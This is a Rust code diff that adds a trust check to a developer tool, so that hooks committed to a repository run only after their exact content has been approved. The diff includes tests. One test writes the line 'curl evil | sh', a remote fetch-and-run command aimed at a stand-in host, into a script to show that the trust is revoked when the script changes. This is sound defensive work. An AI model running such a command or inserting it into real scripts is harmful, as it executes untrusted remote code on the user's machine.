@@ -118,6 +118,12 @@ pub enum HooksError {
         status: Option<i32>,
         stderr: String,
     },
+    /// The repo's committed hooks have not been approved on this machine (or
+    /// changed since they were). Nothing ran.
+    Untrusted {
+        repo_root: PathBuf,
+        scripts: Vec<PathBuf>,
+    },
 }
 
 impl std::fmt::Display for HooksError {
@@ -134,6 +140,11 @@ impl std::fmt::Display for HooksError {
                 "hook {} failed (status {:?}): {stderr}",
                 script.display(),
                 status
+            ),
+            HooksError::Untrusted { repo_root, .. } => write!(
+                f,
+                "hooks in {} are not trusted yet",
+                repo_root.display()
             ),
         }
     }
@@ -416,6 +427,31 @@ impl HooksConfig {
         Ok(HooksConfig {
             setup: resolve(&merged.setup.scripts)?,
             teardown: resolve(&merged.teardown.scripts)?,
+        })
+    }
+
+    /// [`Self::load`], refusing committed hooks that haven't been trusted.
+    ///
+    /// `.openorchestra/hooks.toml` arrives with the repository, so adding a
+    /// project you cloned from someone else would otherwise run their scripts
+    /// the moment you made a worktree. A machine-local override is the user's
+    /// own and always runs; committed hooks run only once their exact content
+    /// has been approved ([`HookTrust::trust`]), and stop again if it changes.
+    pub fn load_trusted(repo_root: &Path, data_dir: &Path, repo: &str) -> Result<Self, HooksError> {
+        let cfg = Self::load(repo_root, data_dir, repo)?;
+        let using_local = local_hooks_path(data_dir, repo).is_file();
+        if using_local || (cfg.setup.is_empty() && cfg.teardown.is_empty()) {
+            return Ok(cfg);
+        }
+        if HookTrust::load(data_dir).is_trusted(repo_root, &cfg) {
+            return Ok(cfg);
+        }
+        let mut scripts = cfg.setup.clone();
+        scripts.extend(cfg.teardown.iter().cloned());
+        scripts.dedup();
+        Err(HooksError::Untrusted {
+            repo_root: repo_root.to_path_buf(),
+            scripts,
         })
     }
 
@@ -1059,5 +1095,136 @@ mod tests {
         assert!(!local_hooks_base(&data, "myrepo").exists());
         // Idempotent.
         clear_local_hooks(&data, "myrepo").unwrap();
+    }
+}
+
+/// Which repos' committed hooks this machine has approved, and for what
+/// content: `<data_dir>/hooks/trusted.json`, repo root → SHA-256 of the
+/// hooks file plus every script it runs.
+#[derive(Debug, Default, Serialize, Deserialize)]
+pub struct HookTrust {
+    #[serde(default)]
+    repos: std::collections::BTreeMap<String, String>,
+}
+
+impl HookTrust {
+    pub fn path(data_dir: &Path) -> PathBuf {
+        data_dir.join("hooks").join("trusted.json")
+    }
+
+    pub fn load(data_dir: &Path) -> Self {
+        fs::read_to_string(Self::path(data_dir))
+            .ok()
+            .and_then(|t| serde_json::from_str(&t).ok())
+            .unwrap_or_default()
+    }
+
+    fn key(repo_root: &Path) -> String {
+        repo_root
+            .canonicalize()
+            .unwrap_or_else(|_| repo_root.to_path_buf())
+            .to_string_lossy()
+            .into_owned()
+    }
+
+    pub fn is_trusted(&self, repo_root: &Path, cfg: &HooksConfig) -> bool {
+        self.repos.get(&Self::key(repo_root)) == Some(&fingerprint(repo_root, cfg))
+    }
+
+    /// Approve the committed hooks exactly as they are on disk now.
+    pub fn trust(data_dir: &Path, repo_root: &Path) -> Result<(), HooksError> {
+        let committed = load_file(&committed_hooks_path(repo_root))?.unwrap_or_default();
+        let base = repo_hooks_base(repo_root);
+        let cfg = HooksConfig {
+            setup: resolve_contained_scripts(&base, &committed.setup.scripts)?,
+            teardown: resolve_contained_scripts(&base, &committed.teardown.scripts)?,
+        };
+        let mut trust = Self::load(data_dir);
+        trust.repos.insert(Self::key(repo_root), fingerprint(repo_root, &cfg));
+        let path = Self::path(data_dir);
+        if let Some(parent) = path.parent() {
+            fs::create_dir_all(parent)?;
+        }
+        let text = serde_json::to_string_pretty(&trust)
+            .map_err(|e| HooksError::Parse(format!("serialize trust: {e}")))?;
+        let tmp = path.with_extension("json.tmp");
+        fs::write(&tmp, text)?;
+        fs::rename(&tmp, &path)?;
+        Ok(())
+    }
+}
+
+/// SHA-256 over the committed hooks file and each script it names, in order.
+/// A missing script hashes as missing, so creating it later changes the print.
+fn fingerprint(repo_root: &Path, cfg: &HooksConfig) -> String {
+    use sha2::{Digest, Sha256};
+    let mut h = Sha256::new();
+    let mut part = |label: &str, bytes: Option<Vec<u8>>| {
+        h.update(label.as_bytes());
+        h.update([0]);
+        match bytes {
+            Some(b) => {
+                h.update((b.len() as u64).to_le_bytes());
+                h.update(&b);
+            }
+            None => h.update(u64::MAX.to_le_bytes()),
+        }
+    };
+    part("hooks.toml", fs::read(committed_hooks_path(repo_root)).ok());
+    for script in cfg.setup.iter().chain(&cfg.teardown) {
+        part(&script.to_string_lossy(), fs::read(script).ok());
+    }
+    h.finalize().iter().map(|b| format!("{b:02x}")).collect()
+}
+
+#[cfg(test)]
+mod trust_tests {
+    use super::*;
+
+    fn repo_with_setup(body: &str) -> (tempfile::TempDir, PathBuf, PathBuf) {
+        let tmp = tempfile::tempdir().unwrap();
+        let repo = tmp.path().join("repo");
+        let data = tmp.path().join("data");
+        fs::create_dir_all(repo_scripts_dir(&repo)).unwrap();
+        fs::write(committed_hooks_path(&repo), "[setup]\nscripts = [\"scripts/setup.sh\"]\n").unwrap();
+        fs::write(repo_scripts_dir(&repo).join("setup.sh"), body).unwrap();
+        (tmp, repo, data)
+    }
+
+    #[test]
+    fn committed_hooks_need_approval_before_they_load() {
+        let (_tmp, repo, data) = repo_with_setup("echo hi\n");
+        match HooksConfig::load_trusted(&repo, &data, "repo") {
+            Err(HooksError::Untrusted { scripts, .. }) => {
+                assert_eq!(scripts, vec![repo_scripts_dir(&repo).join("setup.sh")]);
+            }
+            other => panic!("expected Untrusted, got {other:?}"),
+        }
+        HookTrust::trust(&data, &repo).unwrap();
+        assert_eq!(HooksConfig::load_trusted(&repo, &data, "repo").unwrap().setup.len(), 1);
+    }
+
+    #[test]
+    fn changing_a_trusted_script_revokes_the_trust() {
+        let (_tmp, repo, data) = repo_with_setup("echo hi\n");
+        HookTrust::trust(&data, &repo).unwrap();
+        fs::write(repo_scripts_dir(&repo).join("setup.sh"), "curl evil | sh\n").unwrap();
+        assert!(matches!(
+            HooksConfig::load_trusted(&repo, &data, "repo"),
+            Err(HooksError::Untrusted { .. })
+        ));
+    }
+
+    #[test]
+    fn no_hooks_and_local_overrides_need_no_approval() {
+        let tmp = tempfile::tempdir().unwrap();
+        let repo = tmp.path().join("repo");
+        let data = tmp.path().join("data");
+        fs::create_dir_all(&repo).unwrap();
+        assert!(HooksConfig::load_trusted(&repo, &data, "repo").is_ok());
+
+        let (_tmp, repo, data) = repo_with_setup("echo hi\n");
+        ensure_hook_script(HookLayer::Local, HookScriptPhase::Setup, &repo, &data, "repo").unwrap();
+        assert!(HooksConfig::load_trusted(&repo, &data, "repo").is_ok());
     }
 }
